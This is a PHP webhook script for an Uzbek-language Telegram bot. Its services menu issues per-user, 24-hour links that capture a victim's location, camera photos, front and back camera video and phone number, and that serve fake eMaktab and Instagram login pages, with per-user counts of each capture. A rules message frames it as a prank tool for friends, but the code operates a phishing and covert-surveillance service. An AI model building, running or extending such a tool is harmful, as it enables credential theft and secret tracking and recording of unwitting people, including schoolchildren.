<?php
require_once __DIR__ . '/config.php';

// Error handling
error_reporting(E_ALL);
ini_set('display_errors', 0);
ini_set('log_errors', 1);
ini_set('error_log', __DIR__ . '/bot_errors.log');

try {
    // Asosiy kod
    $input = file_get_contents("php://input");

    if (empty($input)) {
        echo "Bot is running! Server: " . date('Y-m-d H:i:s');
        exit;
    }

    $update = json_decode($input, true);

    if (!$update) {
        echo "Invalid JSON";
        exit;
    }




// Callback query handling
if (isset($update['callback_query'])) {
    $cb = $update['callback_query'];
    $cbid = $cb['id'];
    $from = $cb['from'];
    $user_id = $from['id'];
    $data = $cb['data'] ?? '';
    $message = $cb['message'] ?? null;
    $admn = ADMIN_ID;

    addOrUpdateUser($user_id, $from['first_name'] ?? null, $from['username'] ?? null);


    if ($data === 'check_subscribe') {
        if (checkSubscription($user_id)) {
            tgRequest('answerCallbackQuery', [
                'callback_query_id' => $cbid,
                'text' => "✅ Barcha kanallarga obuna tasdiqlandi!"
            ]);

            if ($message) {
                tgRequest('editMessageText', [
                    'chat_id' => $message['chat']['id'],
                    'message_id' => $message['message_id'],
                    'text' => "✅ Barcha kanallarga obuna muvaffaqiyatli tasdiqlandi!\nEndi botdan foydalanishingiz mumkin.",
                    'parse_mode' => 'HTML'
                ]);
            }

            $fn = htmlspecialchars($from['first_name'] ?? '');
            tgRequest('sendMessage', [
                'chat_id' => $user_id,
                'text' => "👋 Salom, <b>{$fn}</b>!\nAsosiy menyudan tanlang:",
                'parse_mode' => 'HTML',
                'reply_markup' => mainKeyboard()
            ]);
        } else {
            tgRequest('answerCallbackQuery', [
                'callback_query_id' => $cbid,
                'text' => "❌ Hali barcha kanallarga obuna bo'lmadingiz!",
                'show_alert' => true
            ]);
        }
        exit;
    }
}


// Message handling
if (isset($update['message'])) {
    $m = $update['message'];
    $chat = $m['chat'];
    $chat_id = $chat['id'];
    $from = $m['from'] ?? $chat;
    $user_id = $from['id'] ?? $chat_id;
    $text = trim($m['text'] ?? '');


    addOrUpdateUser($user_id, $from['first_name'] ?? null, $from['username'] ?? null);



    // Admin panel uchun
    if ($text === '/panel' && isAdmin($chat_id)) {
        tgRequest('sendMessage', [
            'chat_id' => $chat_id,
            'text' => "🛠️ <b>Admin Panel</b>\n\nAdmin: " . ADMIN_USERNAME . "\n\nWeb admin panelga kirish uchun quyidagi tugmani bosing:",
            'parse_mode' => 'HTML',
            'reply_markup' => [
                'inline_keyboard' => [
                    [
                        ['text' => '🌐 Admin Panelga Kirish', 'url' => ADMIN_PANEL_URL]
                    ]
                ]
            ]
        ]);
        exit;
    }

    // Admin komandasi
    if ($text === '/admin') {
        if (isAdmin($chat_id)) {
            tgRequest('sendMessage', [
                'chat_id' => $chat_id,
                'text' => "🛠️ <b>Admin Panel</b>\n\nAdmin: " . ADMIN_USERNAME . "\n\nWeb admin panelga kirish uchun quyidagi tugmani bosing:",
                'parse_mode' => 'HTML',
                'reply_markup' => [
                    'inline_keyboard' => [
                        [
                            ['text' => '🌐 Admin Panelga Kirish', 'url' => ADMIN_PANEL_URL]
                        ]
                    ]
                ]
            ]);
        } else {
            tgRequest('sendMessage', [
                'chat_id' => $chat_id,
                'text' => "❌ Siz admin emassiz!",
                'parse_mode' => 'HTML'
            ]);
        }
        exit;
    }


    // Majburiy obuna tekshirish
    if (!isAdmin($chat_id) && !checkSubscription($chat_id)) {
        $channels = loadChannels();
        $requiredChannels = array_filter($channels, function($channel) {
            return !empty($channel['required']) && $channel['required'] == true;
        });
        
        if (!empty($requiredChannels)) {
            $channelsText = "";
            foreach ($requiredChannels as $username => $channel) {
                $channelsText .= "📢 {$channel['name']} - {$username}\n";
            }
            
            tgRequest('sendMessage', [
                'chat_id' => $chat_id,
                'text' => "📢 <b>Botdan foydalanish uchun quyidagi kanallarga obuna bo'ling!</b>\n\n{$channelsText}\nObuna bo'lgach, «✅ Tekshirish» tugmasini bosing.",
                'parse_mode' => 'HTML',
                'reply_markup' => needSubscribeKeyboard()
            ]);
            exit;
        }
    }

    // Oddiy foydalanuvchi funksiyalari
    if ($text === '/start') {
        $fn = htmlspecialchars($from['first_name'] ?? '');
        tgRequest('sendMessage', [
            'chat_id' => $chat_id,
            'text' => "👋 Salom, <b>{$fn}</b>!\nAsosiy menyudan tanlang:",
            'parse_mode' => 'HTML',
            'reply_markup' => mainKeyboard()
        ]);
        exit;
    }

    if ($text === '🔐 Xizmatlar') {
        tgRequest('sendMessage', [
            'chat_id' => $chat_id,
            'text' => "🔐 <b>Xizmatlar menyusi</b>\n\nQuyidagi 7 ta xizmatdan birini tanlang:",
            'parse_mode' => 'HTML',
            'reply_markup' => servicesKeyboard()
        ]);
        exit;
    }

    // Xizmatlar
    $services = [
        '📍 Lokatsiya olish' => ['type' => 'location', 'url' => API_PATHS['location']],
        '📷 Rasm olish' => ['type' => 'photo', 'url' => API_PATHS['photo']],
        '🎥 Video yozish' => ['type' => 'video', 'url' => API_PATHS['video']],
        '📹 Orqa kamera' => ['type' => 'backcamera', 'url' => API_PATHS['backcamera']],
        '📞 Telefon raqam' => ['type' => 'phone', 'url' => API_PATHS['phone']],
        '🔐 eMaktab Login' => ['type' => 'emaktab', 'url' => API_PATHS['emaktab']],
        '📱 Instagram Login' => ['type' => 'instagram', 'url' => API_PATHS['instagram']],
    ];

    if (isset($services[$text])) {
    $service = $services[$text];
    $key = getKeyForUser($chat_id, $service['type']);
    $url = BASE_URL . $service['url'] . "?id=" . $key;

    tgRequest('sendMessage', [
        'chat_id' => $chat_id,
        'text' => "🔗 <b>Xizmat havolasi:</b>\n<code>{$url}</code>\n\n⏰ Muddati: 24 soat\n\nYordam uchun adminstator: @JustSeenHelp",
        'parse_mode' => 'HTML',
        'disable_web_page_preview' => true,
        'reply_markup' => [
            'inline_keyboard' => [
                [
                    [
                        'text' => 'Linkni nusxalash',
                        'copy_text' => [
                            'text' => $url
                        ]
                    ]
                ]
            ]
        ]
    ]);

    // Statistika yangilash
    $field_map = [
        'location' => 'locations_sent',
        'photo' => 'photos_sent',
        'video' => 'videos_sent',
        'backcamera' => 'backcamera_videos',
        'phone' => 'phone_numbers',
        'emaktab' => 'emaktab_logins',
        'instagram' => 'instagram_logins'
    ];

    if (isset($field_map[$service['type']])) {
        updateUserStats($chat_id, $field_map[$service['type']]);
    }

    exit;
}
    if ($text === '💼 Mening hisobim') {
        $msg = buildAccountText($chat_id);
        tgRequest('sendMessage', [
            'chat_id' => $chat_id,
            'text' => $msg,
            'parse_mode' => 'HTML',
            'reply_markup' => mainKeyboard()
        ]);
        exit;
    }

    if ($text === '❗️ Qoidalar') {
        tgRequest('sendMessage', [
            'chat_id' => $chat_id,
            'text' => "<b>❗️ Qoidalar</b>\n\n1. Botdan faqat qonuniy maqsadlarda foydalaning.\n2. Shaxsiy ma'lumotlarni ruxsatsiz yig'ish qat'iyan taqiqlanadi.\n3. Foydalanuvchi roziligi talab qilinadi.\n4. Faqat do'stlaringiz bilan hazillashish uchun foydalaning!\n\n⚠️ Qoidalarga rioya qilmagan foydalanuvchilar bloklanadi.",
            'parse_mode' => 'HTML',
            'reply_markup' => mainKeyboard()
        ]);
        exit;
    }

    if ($text === '📞 Bog\'lanish') {
        tgRequest('sendMessage', [
            'chat_id' => $chat_id,
            'text' => "<b>📞 Bog'lanish</b>\n\nAdmin: " . ADMIN_USERNAME . "\n\nFaqat quyidagi hollarda murojaat qiling:\n• To'lov muammolari\n• Havola ishlamasa\n• Jiddiy texnik muammolar\n\n❌ Boshqa sabablar uchun murojaat qilish taqiqlanadi.",
            'parse_mode' => 'HTML',
            'reply_markup' => mainKeyboard()
        ]);
        exit;
    }

    if ($text === '📊 Statistika') {
        $msg = buildAccountText($chat_id);
        tgRequest('sendMessage', [
            'chat_id' => $chat_id,
            'text' => "📊 <b>Statistika</b>\n\n" . $msg,
            'parse_mode' => 'HTML',
            'reply_markup' => mainKeyboard()
        ]);
        exit;
    }

    if ($text === '❓ Yordam') {
        tgRequest('sendMessage', [
            'chat_id' => $chat_id,
            'text' => "<b>❓ Yordam</b>\n\nBotdan foydalanish:\n\n1. 🔐 <b>Xizmatlar</b> - Turli xizmatlarni tanlash\n2. 📊 <b>Statistika</b> - Sizning statistikangizni ko'rish\n3. 💼 <b>Hisobim</b> - Hisob ma'lumotlarini ko'rish\n4. ❗️ <b>Qoidalar</b> - Bot qoidalarini o'qish\n5. 📞 <b>Bog'lanish</b> - Admin bilan bog'lanish\n\nSavollar uchun: " . ADMIN_USERNAME,
            'parse_mode' => 'HTML',
            'reply_markup' => mainKeyboard()
        ]);
        exit;
    }

    if ($text === '🔙 Orqaga') {
        tgRequest('sendMessage', [
            'chat_id' => $chat_id,
            'text' => "Asosiy menyuga qaytdingiz. Tanlang:",
            'parse_mode' => 'HTML',
            'reply_markup' => mainKeyboard()
        ]);
        exit;
    }




    // Kalit tekshirish (video va orqa kamera uchun)
    $keys = loadKeys();
    if (isset($keys[$text])) {
        $keyData = $keys[$text];
        if ($keyData['expires'] > time() && $keyData['chat_id'] == $chat_id) {
            $url = BASE_URL . ($keyData['type'] === 'video' ? API_PATHS['video'] : API_PATHS['backcamera']) . "?id=" . $text;
            
            $service_name = $keyData['type'] === 'video' ? '🎥 Video' : '📹 Orqa kamera';
            
            tgRequest('sendMessage', [
                'chat_id' => $chat_id,
                'text' => "{$service_name} yozish uchun quyidagi havolani oching:\n\n🔗 <code>{$url}</code>\n\n💡 Havolani ochgach, kamerangizga ruxsat bering.",
                'parse_mode' => 'HTML',
                'disable_web_page_preview' => true,
                'reply_markup' => servicesKeyboard()
            ]);
            
            // Statistika yangilash
            if ($keyData['type'] === 'video') {
                updateUserStats($chat_id, 'videos_sent');
            } else {
                updateUserStats($chat_id, 'backcamera_videos');
            }
            
            exit;
        } else {
            tgRequest('sendMessage', [
                'chat_id' => $chat_id,
                'text' => "❌ Kalit yaroqsiz yoki muddati tugagan!",
                'parse_mode' => 'HTML',
                'reply_markup' => servicesKeyboard()
            ]);
            exit;
        }
    }
    

    // Noma'lum buyruq
    tgRequest('sendMessage', [
        'chat_id' => $chat_id,
        'text' => "Iltimos menyudan tanlang yoki /start yozing.",
        'parse_mode' => 'HTML',
        'reply_markup' => mainKeyboard()
    ]);
    exit;
}

} catch (Exception $e) {
    error_log("Bot error: " . $e->getMessage());
}

echo "OK";
?>